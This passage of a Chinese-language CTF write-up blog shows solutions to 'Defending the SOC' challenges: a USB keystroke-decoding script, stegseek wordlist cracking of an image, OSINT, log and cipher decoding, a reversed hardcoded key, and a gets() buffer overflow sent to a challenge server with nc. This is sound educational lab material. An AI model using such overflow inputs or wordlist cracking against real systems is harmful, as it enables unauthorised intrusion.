class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line in keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] in normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    except:<br>        pass<br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i in range(len(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        del output[a]<br>        del output[a<span class="hljs-number">-1</span>]<br>    except:<br>        pass<br><br><span class="hljs-keyword">for</span> i in range(len(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    except:<br>        pass<br><br><span class="hljs-keyword">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/桌面]<br>└─$ python keyboard2.py capture.pcap<br>flagusbp4ck3tc4ptur31sfun<br>output :flagusbp4ck3tc4ptur31sfun<br></code></pre></td></tr></table></figure><p>最终flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;usb_p4ck3t_c4ptur3_1s_fun&#125;<br></code></pre></td></tr></table></figure><h2 id="Maybe-the-helper-can-help"><a href="#Maybe-the-helper-can-help" class="headerlink" title="Maybe the helper can help*"></a>Maybe the helper can help*</h2><p>You might not see it, but a flag lies within.<br>Flag Format: flag{string}<br><a href="https://defendingthesoc.ctf.cert.rcts.pt/files/381da97acc33337ebd29947e96a64489/the-jetsons-family.jpg?token=.eJyrViotTi2Kz0xRsjI2t9BRKklNzAXzDEG8tMycVAjPuBYAHzcM-w.YRKcRg.4xDdntnvO0prymoRoIRMSZgh-9c">the-jetsons-family.jpg</a></p><p>参考其他人的wp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">使用 stegseek 我们得到的关键短语是 rosie<br>stegseek --crack the-jetsons-family.jpg --wordlist /usr/share/dict/rockyou.txt<br><br>cat the-jetsons-family.jpg.out<br><br>cat the-jetsons-family.jpg.out | base64 -d | base64 -d<br></code></pre></td></tr></table></figure><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Welcome-to-Lisbon"><a href="#Welcome-to-Lisbon" class="headerlink" title="Welcome to Lisbon!"></a>Welcome to Lisbon!</h2><p>Oh, some activists defaced a Victoria Secret’s store.<br>Find out which was the model whose photo was damaged.<br>Flag format: flag{firstname_surname}</p><p>社工题</p><p>welcome_to_lisbon.jpg</p><p><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20210815000735730.png" alt="image-20210815000735730"></p><p>从题目名字我们可以知道这家商店位于葡萄牙的里斯本，谷歌搜索 Victoria Secret  Lisbon可以找到店铺位置</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/000615-289546.png" alt="image-20210815000614963"></p><p>题目所给图片被打码的就是这个模特，搜索Victoria Secret model可以找到是这位模特<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/000704-440418.png" alt="image-20210815000703316"></p><p>阿德瑞娜·利玛 (Adriana Lima)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;adriana_lima&#125;<br></code></pre></td></tr></table></figure><h1 id="Mission"><a href="#Mission" class="headerlink" title="Mission"></a>Mission</h1><h2 id="Something-Suspicious"><a href="#Something-Suspicious" class="headerlink" title="Something Suspicious"></a>Something Suspicious</h2><p><strong>#mission#logging</strong><br>We have detected a strange activity inside our network and manage to get some logs from it.<br>Can you see what happened and if there was a host compromised?<br>Flag format: flag{string}<br><a href="https://defendingthesoc.ctf.cert.rcts.pt/files/30cdb8a4f31d0b27758faeeac7ebda13/ftp.log?token=eyJ1c2VyX2lkIjozNzgsInRlYW1faWQiOjE3OCwiZmlsZV9pZCI6MjV9.YRKddA.92AZrYQTkmEqOoywWMhuxTJv9mE">ftp.log</a><br><a href="https://defendingthesoc.ctf.cert.rcts.pt/files/cebf554150f74e6003e50daaf5397ac2/ssh.log?token=eyJ1c2VyX2lkIjozNzgsInRlYW1faWQiOjE3OCwiZmlsZV9pZCI6Mjl9.YRKddA.lt-3rgM4YA657U2VZWUICCxFi2Y">ssh.log</a>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ftp.log:ZmxhZ3tzMG0zdGgxbmc=  -&gt;  flag&#123;s0m3th1ng<br>ssh.log:X3N1c3AxYzEwdXN9    -&gt;  _susp1c10us&#125;<br></code></pre></td></tr></table></figure><p>最终flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;s0m3th1ng_susp1c10us&#125;<br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Well-hello-there"><a href="#Well-hello-there" class="headerlink" title="Well hello there"></a>Well hello there</h2><p><strong>#pwn#c</strong><br>We initiated the development of a bot. So far it greets you by your name. Can you test it?<br>Access: nc challenges.defsoc.tk 22228<br>Flag format: flag{string}</p><p>拖入IDA查看main函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">76</span>]; // [rsp+0h] [rbp-58h] BYREF<br>  <span class="hljs-built_in">int</span> v5; // [rsp+4Ch] [rbp-Ch]<br><br>  puts(<span class="hljs-string">&quot;Hello there! What is your name?&quot;</span>);<br>  fflush(_bss_start);<br>  v5 = <span class="hljs-number">0</span>;<br>  gets(v4, argv);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    printf(<span class="hljs-string">&quot;Well, hello %s!&quot;</span>, v4);<br>  putchar(<span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>缓冲区溢出,name超过 76 个字符即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ ./program_local        <br>Hello there! What is your name?<br>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;<br><br><br>$ nc challenges.defsoc.tk 22228   <br>Hello there! What is your name?<br>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>flag&#123;buff3r_0v3rfl0w_r0cks&#125;<br></code></pre></td></tr></table></figure><p>web手做出的第一个pwn题</p><h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><h2 id="You-are-not-allowed"><a href="#You-are-not-allowed" class="headerlink" title="You are not allowed"></a>You are not allowed</h2><p><strong>#reverse#c</strong><br>Can you reverse this program and get us the flag?<br>Flag format: flag{string}</p><p>这个逆向也很简单，拖入IDA找到main函数，然后F5，可以看到sub_401242函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">char</span> *s1; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter the secret key : &quot;</span>);<br>  fgets(s, <span class="hljs-number">64</span>, <span class="hljs-built_in">stdin</span>);<br>  s1 = sub_401242();<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, s, <span class="hljs-number">0xF</span>uLL) )<br>    v6 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong key entered! Try again? &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>    sub_401182();<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>找到sub_401242函数，同样F5</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">sub_401242</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v1[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+9h] [rbp-27h] BYREF</span><br>  <span class="hljs-keyword">char</span> *s; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  qmemcpy(v1, <span class="hljs-string">&quot;Sup3rS3cr3tK3y#&quot;</span>, <span class="hljs-keyword">sizeof</span>(v1));<br>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4uLL</span>);<br>  s = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1F</span>uLL);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt;= <span class="hljs-number">0xE</span>; ++i )<br>  &#123;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-keyword">unsigned</span> __int8)v1[i]);<br>    <span class="hljs-built_in">strcat</span>(dest, s);<br>  &#125;<br>  <span class="hljs-keyword">return</span> dest;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到字符串Sup3rS3cr3tK3y#，输入即可得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/桌面]<br>└─$ ./program<br>Enter the secret key : <br>Sup3rS3cr3tK3y<span class="hljs-comment">#</span><br>flag&#123;<span class="hljs-number">1</span>ntr0_t0_r3v3rs3_3ng1n33r1ng&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="A-simple-challenge"><a href="#A-simple-challenge" class="headerlink" title="A simple challenge"></a>A simple challenge</h2><p><strong>#crypto#encoding</strong><br>We have intercepted the following message and we think it has a secret flag in it.<br>Can you decode it?<br>Flag format: flag{string}<br>​</p><p>secret_message.txt：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ==<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">import base64<br>str=<span class="hljs-string">&quot;Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ==&quot;</span><br>num=<span class="hljs-number">0</span>  <br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>        num=num+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;第%d次解码&quot;</span> %(num))<br>        str = base64.b64decode(str.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        str=str.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">print</span>(str)<br>except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>     <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;END&quot;</span>)      <br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">This is a secret message: flag&#123;<span class="hljs-number">3</span>nc0d1ng_1s_n0t_3ncrypt10n!&#125;<br></code></pre></td></tr></table></figure><h2 id="Roman-encryption"><a href="#Roman-encryption" class="headerlink" title="Roman encryption"></a>Roman encryption</h2><p><strong>#crypto#cipher</strong><br>We intercepted an encrypted communication that was meant to be delivered to a threat actor named Julius.<br>Apparently his name is the key to decipher this message.<br>Can you decipher it?<br>Flag format: flag{string}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">Csddk Rtdetp,<br>Qcghb ykt jko ykto ptmmkoq,<br>Ykt igh tps qcep bsy qk osisevs ykto oswgou: jdgl&#123;<span class="hljs-number">5</span>ta5q1qtq10h_1p_b3y&#125;<br></code></pre></td></tr></table></figure><p><a href="https://quipqiup.com/">https://quipqiup.com/</a>令jdgl=flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello Julius, Thank you <span class="hljs-keyword">for</span> your support, You can <span class="hljs-keyword">use</span> <span class="hljs-title">this</span> <span class="hljs-title">key</span> <span class="hljs-title">to</span> <span class="hljs-title">receive</span> <span class="hljs-title">your</span> <span class="hljs-title">reward</span>: <span class="hljs-title">flag</span>&#123;5<span class="hljs-title">um5t1tut10n_1s_k3y</span>&#125;<br></code></pre></td></tr></table></figure><p>提交flag不对，继续查看题目提示，应该是带key的凯撒密码<br>​</p><p>解密网站：<a href="https://www.boxentriq.com/code-breaking/keyed-caesar-cipher">https://www.boxentriq.com/code-breaking/keyed-caesar-cipher</a><br>搜索 Julius得到全称Gaius Julius Caesar，即为key解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Niji ce uni pieebai:<br>Hello Julius,<br>Thank you <span class="hljs-keyword">for</span> your support,<br>You can use this key to receive your reward: flag&#123;5ub5t1tut10n_1s_k3y&#125;<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Hextraordinary-security"><a href="#Hextraordinary-security" class="headerlink" title="Hextraordinary security"></a>Hextraordinary security</h2><p><strong>#crypto#encoding</strong><br>We just found this garbage file.<br>Can you decode it and retrieve any useful information from it?<br>Flag format: flag{string}<br>​</p><p>hex转str</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;


